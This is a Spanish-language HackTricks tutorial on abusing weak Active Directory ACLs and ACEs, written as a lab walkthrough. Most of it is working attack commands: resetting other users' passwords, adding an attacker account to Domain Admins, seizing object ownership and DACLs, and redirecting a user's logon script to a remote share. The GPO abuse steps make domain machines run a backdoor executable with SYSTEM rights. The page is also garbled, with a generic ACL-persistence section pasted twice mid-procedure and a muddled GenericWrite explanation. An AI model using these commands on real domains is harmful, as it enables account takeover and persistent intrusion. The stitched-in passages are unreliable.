# Abusando de los ACLs/ACEs de Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Contexto

Este laboratorio es para abusar de los permisos débiles de las Listas de Control de Acceso Discrecional (DACLs) y las Entradas de Control de Acceso (ACEs) de Active Directory que conforman las DACLs.

Los objetos de Active Directory, como los usuarios y los grupos, son objetos seguros y las DACL/ACEs definen quién puede leer/modificar esos objetos (es decir, cambiar el nombre de la cuenta, restablecer la contraseña, etc.).

Un ejemplo de ACEs para el objeto seguro "Administradores de dominio" se puede ver aquí:

![](../../../.gitbook/assets/1.png)

Algunos de los permisos y tipos de objetos de Active Directory que nos interesan como atacantes son:

* **GenericAll** - derechos completos sobre el objeto (añadir usuarios a un grupo o restablecer la contraseña del usuario)
* **GenericWrite** - actualizar los atributos del objeto (es decir, el script de inicio de sesión)
* **WriteOwner** - cambiar el propietario del objeto a un usuario controlado por el atacante para tomar el control del objeto
* **WriteDACL** - modificar las ACEs del objeto y dar al atacante el derecho de control total sobre el objeto
* **AllExtendedRights** - capacidad de añadir un usuario a un grupo o restablecer la contraseña
* **ForceChangePassword** - capacidad de cambiar la contraseña del usuario
* **Self (Self-Membership)** - capacidad de añadirse a uno mismo a un grupo

En este laboratorio, vamos a explorar e intentar explotar la mayoría de los ACEs mencionados anteriormente.

Vale la pena familiarizarse con todos los [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) y con tantos [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) de Active Directory como sea posible, ya que nunca se sabe cuándo se puede encontrar uno menos común durante una evaluación.

## GenericAll en Usuario

Usando powerview, comprobemos si nuestro usuario atacante `spotless` tiene derechos de `GenericAll` sobre el objeto AD para el usuario `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```
Podemos ver que efectivamente nuestro usuario `spotless` tiene los derechos de `GenericAll`, lo que permite al atacante tomar el control de la cuenta:

![](../../../.gitbook/assets/2.png)

*   **Cambiar la contraseña**: simplemente se puede cambiar la contraseña de ese usuario con el siguiente comando:

    ```bash
    net user <username> <password> /domain
    ```
*   **Kerberoasting dirigido**: se puede hacer que el usuario sea **kerberoastable** estableciendo un **SPN** en la cuenta, kerberoastearlo e intentar descifrarlo sin conexión:

    ```powershell
    # Establecer SPN
    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
    # Obtener hash
    .\Rubeus.exe kerberoast /user:<username> /nowrap
    # Limpiar SPN
    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

    # También se puede usar la herramienta https://github.com/ShutdownRepo/targetedKerberoast 
    # para obtener hashes de uno o todos los usuarios
    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
    ```
*   **ASREPRoasting dirigido**: se puede hacer que el usuario sea **ASREPRoastable** **desactivando** la **preautenticación** y luego ASREProastearlo.

    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

## GenericAll en Grupo

Veamos si el grupo `Domain admins` tiene algún permiso débil. Primero, obtengamos su `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
# Abuso de persistencia de ACL

## Descripción

El abuso de persistencia de ACL se refiere a la técnica de modificar los permisos de acceso de un objeto en Active Directory para lograr persistencia en el sistema. Esto se logra mediante la adición de permisos de acceso a un objeto que permiten a un usuario o grupo específico realizar acciones que normalmente no podrían realizar. Por ejemplo, un atacante podría agregar permisos de acceso a un objeto que le permita crear una cuenta de usuario en Active Directory, lo que le permitiría mantener el acceso al sistema incluso después de que se hayan tomado medidas para eliminar su acceso.

## Metodología

La metodología para el abuso de persistencia de ACL implica los siguientes pasos:

1. Identificar un objeto en Active Directory que tenga permisos de acceso que puedan ser abusados.
2. Modificar los permisos de acceso del objeto para permitir que un usuario o grupo específico realice acciones que normalmente no podrían realizar.
3. Utilizar los permisos de acceso modificados para lograr persistencia en el sistema.

### Identificación de objetos con permisos de acceso abusables

Para identificar objetos en Active Directory que tengan permisos de acceso que puedan ser abusados, se pueden utilizar las siguientes herramientas:

* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [ADACLScanner](https://github.com/canix1/ADACLScanner)

### Modificación de permisos de acceso

Una vez que se ha identificado un objeto con permisos de acceso abusables, se pueden utilizar las siguientes herramientas para modificar los permisos de acceso:

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [ADModify](https://www.microsoft.com/en-us/download/details.aspx?id=19419)

### Utilización de permisos de acceso modificados

Una vez que se han modificado los permisos de acceso de un objeto en Active Directory, se pueden utilizar los permisos de acceso modificados para lograr persistencia en el sistema. Algunos ejemplos de cómo se pueden utilizar los permisos de acceso modificados incluyen:

* Crear una cuenta de usuario en Active Directory que tenga permisos de administrador.
* Agregar un usuario o grupo a un grupo de administradores existente.
* Modificar los permisos de acceso de un objeto para permitir que un usuario o grupo específico tenga acceso a información confidencial.

## Mitigación

Para mitigar el abuso de persistencia de ACL, se deben seguir las mejores prácticas de seguridad de Active Directory, que incluyen:

* Limitar los permisos de acceso a los objetos de Active Directory solo a los usuarios y grupos que necesitan acceso.
* Utilizar grupos de seguridad para asignar permisos de acceso en lugar de asignar permisos de acceso directamente a los usuarios.
* Monitorear los cambios en los permisos de acceso de los objetos de Active Directory y tomar medidas inmediatas si se detecta un cambio no autorizado.
```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nuestro usuario atacante `spotless` tiene derechos de `GenericAll` una vez más:

![](../../../.gitbook/assets/5.png)

Efectivamente, esto nos permite añadirnos a nosotros mismos (el usuario `spotless`) al grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
¡Se puede lograr lo mismo con el módulo de Active Directory o PowerSploit!
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write en Computadora/Usuario

* Si tienes estos privilegios en un **objeto de Computadora**, puedes llevar a cabo [Delegación Restringida Basada en Recursos de Kerberos: Toma de Control de Objeto de Computadora](../resource-based-constrained-delegation.md).
* Si tienes estos privilegios sobre un usuario, puedes usar uno de los [primeros métodos explicados en esta página](./#genericall-on-user).
* O, si los tienes en una Computadora o un usuario, puedes usar **Credenciales de Sombra** para suplantarlos:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty en Grupo

Si nuestro usuario controlado tiene el derecho `WriteProperty` en `Todos` los objetos para el grupo `Administradores de Dominio`:

![](../../../.gitbook/assets/7.png)

Podemos agregar nuevamente a nuestro usuario al grupo `Administradores de Dominio` y escalar privilegios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## Autoasignación de permisos en grupos

Otro privilegio que permite al atacante añadirse a un grupo es la autoasignación de permisos en grupos:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## WriteProperty (Auto-Membresía)

Un privilegio más que permite al atacante agregarse a sí mismo a un grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
# Abuso de persistencia de ACL

## Descripción

El abuso de persistencia de ACL se refiere a la técnica de modificar los permisos de acceso de un objeto en Active Directory para lograr persistencia en el sistema. Esto se logra mediante la adición de permisos de acceso a un objeto que permiten a un usuario o grupo específico realizar acciones que normalmente no podrían realizar. Por ejemplo, un atacante podría agregar permisos de acceso a un objeto que le permita crear una cuenta de usuario en Active Directory, lo que le permitiría mantener el acceso al sistema incluso después de que se hayan tomado medidas para eliminar su acceso.

## Metodología

La metodología para el abuso de persistencia de ACL implica los siguientes pasos:

1. Identificar un objeto en Active Directory que tenga permisos de acceso que puedan ser abusados.
2. Modificar los permisos de acceso del objeto para permitir que un usuario o grupo específico realice acciones que normalmente no podrían realizar.
3. Utilizar los permisos de acceso modificados para lograr persistencia en el sistema.

### Identificación de objetos con permisos de acceso abusables

Para identificar objetos en Active Directory que tengan permisos de acceso que puedan ser abusados, se pueden utilizar las siguientes herramientas:

* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [ADACLScanner](https://github.com/canix1/ADACLScanner)

### Modificación de permisos de acceso

Una vez que se ha identificado un objeto con permisos de acceso abusables, se pueden utilizar las siguientes herramientas para modificar los permisos de acceso:

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [ADModify](https://www.microsoft.com/en-us/download/details.aspx?id=19419)

### Utilización de permisos de acceso modificados

Una vez que se han modificado los permisos de acceso de un objeto en Active Directory, se pueden utilizar los permisos de acceso modificados para lograr persistencia en el sistema. Algunos ejemplos de cómo se pueden utilizar los permisos de acceso modificados incluyen:

* Crear una cuenta de usuario en Active Directory que tenga permisos de administrador.
* Agregar un usuario o grupo a un grupo de administradores existente.
* Modificar los permisos de acceso de un objeto para permitir que un usuario o grupo específico tenga acceso a información confidencial.

## Mitigación

Para mitigar el abuso de persistencia de ACL, se deben seguir las mejores prácticas de seguridad de Active Directory, que incluyen:

* Limitar los permisos de acceso a los objetos de Active Directory solo a los usuarios y grupos que necesitan acceso.
* Utilizar grupos de seguridad para asignar permisos de acceso en lugar de asignar permisos de acceso directamente a los usuarios.
* Monitorear los cambios en los permisos de acceso de los objetos de Active Directory y tomar medidas inmediatas si se detecta un cambio no autorizado.
```csharp
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Si tenemos `ExtendedRight` en el tipo de objeto `User-Force-Change-Password`, podemos restablecer la contraseña del usuario sin conocer su contraseña actual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

Realizando lo mismo con powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
Otro método que no requiere manipulación de la conversión de cadenas seguras de contraseña:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...o una sola línea si no hay una sesión interactiva disponible:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

Y una última forma de lograr esto desde Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Más información:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner en Grupo

Observe cómo antes del ataque el propietario de `Domain Admins` es `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Después de la enumeración ACE, si encontramos que un usuario bajo nuestro control tiene derechos de `WriteOwner` en `ObjectType:All`...
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Podemos cambiar el propietario del objeto `Domain Admins` a nuestro usuario, que en nuestro caso es `spotless`. Tenga en cuenta que el SID especificado con `-Identity` es el SID del grupo `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## GenericWrite en Usuario

El permiso `GenericWrite` en un objeto de usuario de Active Directory permite a un usuario modificar los atributos del objeto, incluyendo los permisos de acceso. Esto puede ser abusado para obtener persistencia en el sistema.

Para explotar esta vulnerabilidad, un atacante puede agregar su propio SID (identificador de seguridad) a la lista de control de acceso (ACL) del objeto de usuario, otorgándose así permisos de acceso al objeto. Luego, el atacante puede modificar los atributos del objeto para agregar permisos adicionales a su cuenta, como `GenericAll`, lo que le permitiría tomar el control total del objeto y, por lo tanto, obtener persistencia en el sistema.

Es importante tener en cuenta que este ataque solo es posible si el atacante ya tiene acceso de escritura al objeto de usuario.
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
`WriteProperty` en un `ObjectType`, que en este caso particular es `Script-Path`, permite al atacante sobrescribir la ruta del script de inicio de sesión del usuario `delegate`, lo que significa que la próxima vez que el usuario `delegate` inicie sesión, su sistema ejecutará nuestro script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
A continuación se muestra cómo se actualizó el campo de script de inicio de sesión del usuario ~~`delegate`~~ en AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite en Grupo

Esto te permite agregar nuevos usuarios como miembros del grupo (por ejemplo, tú mismo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## WriteDACL + WriteOwner

Si eres el propietario de un grupo, como yo soy el propietario de un grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

Lo cual, por supuesto, puedes hacer a través de PowerShell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
Si tienes acceso a un objeto de AD como se muestra en la imagen anterior y tienes permisos de `WriteDACL` sobre ese objeto de AD:

![](../../../.gitbook/assets/24.png)

...puedes darte a ti mismo privilegios de [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) con un poco de hechicería de ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
Lo que significa que ahora tienes el control total del objeto AD:

![](../../../.gitbook/assets/25.png)

Esto significa efectivamente que ahora puedes agregar nuevos usuarios al grupo.

Es interesante destacar que no pude abusar de estos privilegios utilizando el módulo de Active Directory y los cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicación en el dominio (DCSync)**

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.\
[**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

A veces, ciertos usuarios/grupos pueden ser delegados para acceder a la gestión de objetos de directiva de grupo, como es el caso del usuario `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver esto aprovechando PowerView de la siguiente manera:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
Lo siguiente indica que el usuario `offense\spotless` tiene privilegios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre otros que son propensos a ser abusados:

![](../../../.gitbook/assets/a14.png)

### Enumerar permisos de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que el ObjectDN anterior de la captura de pantalla se refiere al GPO `New Group Policy Object` ya que el ObjectDN apunta a `CN=Policies` y también a `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que es lo mismo que en la configuración del GPO como se resalta a continuación:

![](../../../.gitbook/assets/a15.png)

Si queremos buscar específicamente GPOs mal configurados, podemos encadenar múltiples cmdlets de PowerSploit de la siguiente manera:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadoras con una política dada aplicada**

Ahora podemos resolver los nombres de las computadoras a las que se aplica la GPO `Política mal configurada`:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
**Políticas aplicadas a un equipo determinado**

Para obtener una lista de las políticas aplicadas a un equipo determinado, podemos ejecutar el siguiente comando:

```
gpresult /Scope Computer /v
```

Este comando nos mostrará una lista de todas las políticas aplicadas al equipo, incluyendo las políticas de seguridad. Podemos buscar en esta lista para ver si hay alguna política que permita a un usuario malintencionado obtener permisos elevados o persistencia en el sistema.
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**Unidades Organizativas con una Política Dada Aplicada**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Una de las formas de abusar de esta mala configuración y obtener la ejecución de código es crear una tarea programada inmediata a través de GPO de la siguiente manera:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

Lo anterior agregará a nuestro usuario "spotless" al grupo local `administrators` de la máquina comprometida. Observe cómo antes de la ejecución del código, el grupo no contiene al usuario `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Puede verificar si el módulo GroupPolicy está instalado con `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En caso de necesidad, puede instalarlo con `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, después de que se actualice el GPO, necesitará que alguien inicie sesión en la computadora.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
No puede crear GPOs, por lo que todavía debemos hacerlo con RSAT o modificar uno al que ya tengamos acceso de escritura.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Actualización forzada de políticas <a href="#force-policy-update" id="force-policy-update"></a>

Las actualizaciones abusivas anteriores de **GPO se recargan** aproximadamente cada 90 minutos.\
Si tienes acceso al equipo, puedes forzarlo con `gpupdate /force`.

### Bajo el capó <a href="#under-the-hood" id="under-the-hood"></a>

Si observamos las Tareas Programadas de la GPO `Política mal configurada`, podemos ver nuestra `evilTask` sentada allí:

![](../../../.gitbook/assets/a22.png)

A continuación se muestra el archivo XML que se creó con `New-GPOImmediateTask` que representa nuestra tarea programada maliciosa en la GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Usuarios y Grupos <a href="#users-and-groups" id="users-and-groups"></a>

La misma escalada de privilegios se puede lograr abusando de la función de Usuarios y Grupos de GPO. Tenga en cuenta en el archivo a continuación, en la línea 6, donde se agrega el usuario `spotless` al grupo local `administrators` - podríamos cambiar el usuario por otro, agregar otro o incluso agregar el usuario a otro grupo / múltiples grupos ya que podemos modificar el archivo de configuración de la política en la ubicación mostrada debido a la delegación de GPO asignada a nuestro usuario `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
{% endcode %}

Además, podríamos pensar en aprovechar los scripts de inicio / cierre de sesión, usar el registro para autoruns, instalar .msi, editar servicios y vías similares de ejecución de código.

## Referencias

* Inicialmente, esta información fue en su mayoría copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
